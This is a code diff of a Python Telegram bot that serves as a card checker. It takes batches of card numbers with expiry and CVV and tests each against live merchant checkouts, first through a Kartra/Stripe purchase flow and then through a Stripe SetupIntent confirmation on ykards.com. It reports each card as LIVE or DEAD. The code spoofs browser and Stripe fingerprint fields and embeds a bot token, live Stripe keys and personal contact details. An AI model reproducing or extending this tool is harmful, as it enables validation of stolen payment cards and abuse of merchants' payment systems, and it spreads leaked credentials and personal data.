@@ -1,186 +1,133 @@
 import telebot
 import requests
-import random
-import string
 import time
+import re
 
 BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-STRIPE_PUBLISHABLE_KEY = "pk_live_51Jhet4HYghhmd4CamObYqu2qaPmZlp3SqgYcBfUbKrgBBnS040UHuHvzuHxl7I4GQwFXEwjAx62BQu01Q76BRmum00dZ72P1K2"
-STRIPE_URL = "https://api.stripe.com/v1/tokens"
-SIGNUP_URL = "https://kymtolson.kartra.com/checkout/createCheckoutLeadFirstStep/"
-FINAL_URL = "https://kymtolson.kartra.com/checkout/purchase_product/"
+YKARDS_URL = "https://ykards.com/stripe/ZN_createSetup_live.php"
+STRIPE_CONFIRM_URL_BASE = "https://api.stripe.com/v1/setup_intents/"
 
-def generate_random_email():
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
-
-def parse_card_input(text):
-    parts = text.strip().split('|')
-    if len(parts) != 4:
+def parse_card(card_text):
+    # Accepts CC|MM|YY|CVV or CC|MM|YYYY|CVV
+    match = re.fullmatch(r"\s*(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\s*", card_text)
+    if not match:
         return None
-    cc, mm, yy, cvc = map(str.strip, parts)
-    if not (cc.isdigit() and mm.isdigit() and cvc.isdigit() and (len(yy) in [2,4])):
-        return None
-    if len(yy) == 2:
-        yy = "20" + yy
-    return cc, mm.zfill(2), yy, cvc
+    cc, mm, yy, cvv = match.groups()
+    mm = mm.zfill(2)
+    if len(yy) == 4:
+        yy = yy[2:]
+    return cc, mm, yy, cvv
 
-def signup_lead(email):
+def get_client_secret():
     headers = {
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "content-type": "application/json",
         "accept": "*/*",
-        "x-requested-with": "XMLHttpRequest",
-        "origin": "https://kymtolson.kartra.com",
-        "referer": "https://kymtolson.kartra.com/",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
+        "origin": "https://ykards.com",
+        "referer": "https://ykards.com/checkout/",
+        "user-agent": "Mozilla/5.0"
     }
-    data = {
-        "payment_data": "3c2ef539ad3c02128b58e3e27d6031b9d9d8d87c34503569cad8e3c2ab7a8ae3df5e923dffadd5206fcd8d12f3085b9ccf6085d532f63a5a998682a7da34ea63AEqm9/...",  # Use your real value here!
-        "first_name": "Peshang",
-        "last_name": "Salam",
-        "email": email,
-        "address": "198 White Horse Pike",
-        "city": "West Collingswood",
-        "zip": "08107",
-        "sales_tax_percent": "0",
-        "country": "USA",
-        "state": "18650",
-        "gdpr_terms": "1",
-        "requestId": str(int(time.time() * 1000)) + ".H4pvoL",
-        "referrer": "https://clinicalaiclub.com/checkout-free-trial/",
-        "kuid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
+    payload = {
+        "email": "peshangsalam2001@gmail.com",
+        "name": "John Doe",
+        "phone": "3144740104",
+        "url": "https://ykards.com/checkout/",
+        "rtid": None,
+        "vertical": None,
+        "subvertical": None,
+        "clickid": None,
+        "alternative": None,
+        "experiment": None
     }
-    # The response is not used for logic, but must be called for signup process
-    requests.post(SIGNUP_URL, data=data, headers=headers)
+    try:
+        resp = requests.post(YKARDS_URL, headers=headers, json=payload, timeout=30)
+        data = resp.json()
+        return data.get("clientSecret")
+    except Exception as e:
+        return None
 
-def create_stripe_token(cc, mm, yy, cvc, email):
+def check_card(cc, mm, yy, cvv, client_secret):
+    if not client_secret:
+        return "❌ Could not get clientSecret from ykards.com"
+    setup_intent_id = client_secret.split("_secret_")[0]
+    confirm_url = f"{STRIPE_CONFIRM_URL_BASE}{setup_intent_id}/confirm"
     headers = {
         "content-type": "application/x-www-form-urlencoded",
         "accept": "application/json",
         "origin": "https://js.stripe.com",
         "referer": "https://js.stripe.com/",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
+        "user-agent": "Mozilla/5.0"
     }
     data = {
-        "card[number]": cc,
-        "card[exp_month]": mm,
-        "card[exp_year]": yy[-2:],  # Stripe expects 2-digit year
-        "card[cvc]": cvc,
-        "card[name]": "Peshang Salam",
-        "card[address_line1]": "198 White Horse Pike",
-        "card[address_city]": "West Collingswood",
-        "card[address_state]": "New Jersey",
-        "card[address_zip]": "08107",
-        "card[address_country]": "USA",
-        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "payment_user_agent": "stripe.js/78ef418",
-        "time_on_page": str(random.randint(10000, 99999)),
-        "key": STRIPE_PUBLISHABLE_KEY,
-        "referrer": "https://kymtolson.kartra.com"
+        "return_url": "https://ykards.com/success/?clickid=null",
+        "payment_method_data[billing_details][address][postal_code]": "10080",
+        "payment_method_data[billing_details][address][country]": "IQ",
+        "payment_method_data[type]": "card",
+        "payment_method_data[card][number]": cc,
+        "payment_method_data[card][cvc]": cvv,
+        "payment_method_data[card][exp_year]": yy,
+        "payment_method_data[card][exp_month]": mm,
+        "payment_method_data[allow_redisplay]": "unspecified",
+        "payment_method_data[pasted_fields]": "number",
+        "payment_method_data[payment_user_agent]": "stripe.js/e01db0f08f; stripe-js-v3/e01db0f08f; payment-element; deferred-intent; autopm",
+        "payment_method_data[referrer]": "https://ykards.com",
+        "payment_method_data[time_on_page]": "47993",
+        "payment_method_data[guid]": "dbad43e7-90f2-4f06-b543-b99cc4a948b65b720d",
+        "payment_method_data[muid]": "3e3655f3-9053-4b67-995a-f07498809d63739d3d",
+        "payment_method_data[sid]": "5d5b0012-cee0-43db-b3ae-1dca1cd4260cc326ae",
+        "expected_payment_method_type": "card",
+        "client_context[currency]": "gbp",
+        "client_context[mode]": "setup",
+        "client_context[setup_future_usage]": "off_session",
+        "use_stripe_sdk": "true",
+        "key": "pk_live_XOftf1rmeEWkESKdM6LYbm3p00gTCsltfJ",
+        "client_secret": client_secret
     }
-    resp = requests.post(STRIPE_URL, data=data, headers=headers)
     try:
-        resp_json = resp.json()
+        resp = requests.post(confirm_url, headers=headers, data=data, timeout=30)
+        result = resp.json()
+        status = result.get("status", "")
+        message = result.get("error", {}).get("message", "")
+        code = result.get("error", {}).get("code", "")
+        decline_code = result.get("error", {}).get("decline_code", "")
+        if status == "succeeded" or status == "requires_action":
+            return (f"✅ LIVE: {cc}|{mm}|{yy}|{cvv}\n"
+                    f"Status: {status}\n"
+                    f"Code: {code}\n"
+                    f"Message: {message}")
+        else:
+            return (f"❌ DEAD: {cc}|{mm}|{yy}|{cvv}\n"
+                    f"Status: {status}\n"
+                    f"Decline Code: {decline_code}\n"
+                    f"Code: {code}\n"
+                    f"Message: {message}")
     except Exception as e:
-        return None, f"Stripe JSON decode error: {str(e)}"
-    token = resp_json.get('id')
-    if not token or not token.startswith("tok_"):
-        return None, f"Stripe error: {resp_json.get('error', {}).get('message', 'Unknown error')}"
-    return token, None
-
-def make_final_request(token, email, cc, mm, yy, cvc):
-    headers = {
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "accept": "*/*",
-        "x-requested-with": "XMLHttpRequest",
-        "origin": "https://kymtolson.kartra.com",
-        "referer": "https://kymtolson.kartra.com/",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
-    }
-    data = {
-        "kartra_reference_id": "42488fcd-d156-4c64-94ec-1188a5b9de51",
-        "payment_data_price_point": "",
-        "quantity": "1",
-        "quantityAppliedPricePoint": "1",
-        "country_vat_popover": "USA",
-        "state_vat_popover": "18650",
-        "code_price_point": "",
-        "coupon_id_price_point": "",
-        "coupon_applied_price_point": "0",
-        "payment_data": "3c2ef539ad3c02128b58e3e27d6031b9d9d8d87c34503569cad8e3c2ab7a8ae3df5e923dffadd5206fcd8d12f3085b9ccf6085d532f63a5a998682a7da34ea63AEqm9/...",  # Use your real value here!
-        "first_name": "Peshang",
-        "last_name": "Salam",
-        "email": email,
-        "address": "198 White Horse Pike",
-        "city": "West Collingswood",
-        "zip": "08107",
-        "sales_tax_percent": "0",
-        "country": "USA",
-        "state": "18650",
-        "gdpr_terms": "1",
-        "optionsRadios": "credit_card",
-        "card_number": cc[-4:],  # last 4 digits
-        "card_exp_month": mm,
-        "card_exp_year": yy[-2:],  # last 2 digits
-        "CVV": cvc,
-        "paypal_email": "",
-        "bump_payment_data": "",
-        "quantityAppliedBump": "0",
-        "selected_price_point": "1",
-        "coupon_id": "",
-        "coupon_applied": "0",
-        "code": "",
-        "quantityApplied": "1",
-        "verifyBuyerCode": "",
-        "stripe_token": token,
-        "referrer": "https://clinicalaiclub.com/checkout-free-trial/",
-        "kuid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
-        # Add any other required fields here!
-    }
-    resp = requests.post(FINAL_URL, data=data, headers=headers)
-    return resp.text
+        return f"❌ Error: {str(e)}"
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
-        "💳 Kartra/ClinicalAIClub Card Checker Bot\n"
+        "💳 YKards Card Checker Bot\n"
         "Send cards in format:\n"
-        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
-        "Example:\n"
-        "5189410225598146|01|29|022\n"
-        "4242424242424242|12|25|123"
+        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
+        "One per line. Example:\n"
+        "4430440021154042|01|28|162\n"
+        "5218531116585093|12|2030|470"
     )
 
 @bot.message_handler(func=lambda message: True)
 def card_handler(message):
     cards = message.text.strip().split('\n')
-    for card_line in cards:
-        parsed = parse_card_input(card_line)
+    for card_text in cards:
+        parsed = parse_card(card_text)
         if not parsed:
-            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
+            bot.send_message(message.chat.id, f"❌ Invalid format: {card_text}")
             continue
-        cc, mm, yy, cvc = parsed
-        email = generate_random_email()
-
-        # 1. Signup process (first URL)
-        signup_lead(email)
-
-        # 2. Stripe token
-        token, err = create_stripe_token(cc, mm, yy, cvc, email)
-        if err:
-            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
-            continue
-
-        # 3. Final purchase request
-        final_response = make_final_request(token, email, cc, mm, yy, cvc)
-        status = "❌ DECLINED" if "declined" in final_response.lower() else "✅ LIVE"
-        bot.send_message(
-            message.chat.id,
-            f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\nStatus: {status}\n\nFull Response:\n{final_response}"
-        )
-        time.sleep(10)  # 10 seconds delay between cards
+        cc, mm, yy, cvv = parsed
+        client_secret = get_client_secret()
+        result = check_card(cc, mm, yy, cvv, client_secret)
+        bot.send_message(message.chat.id, result)
+        time.sleep(10)
 
 bot.infinity_polling()
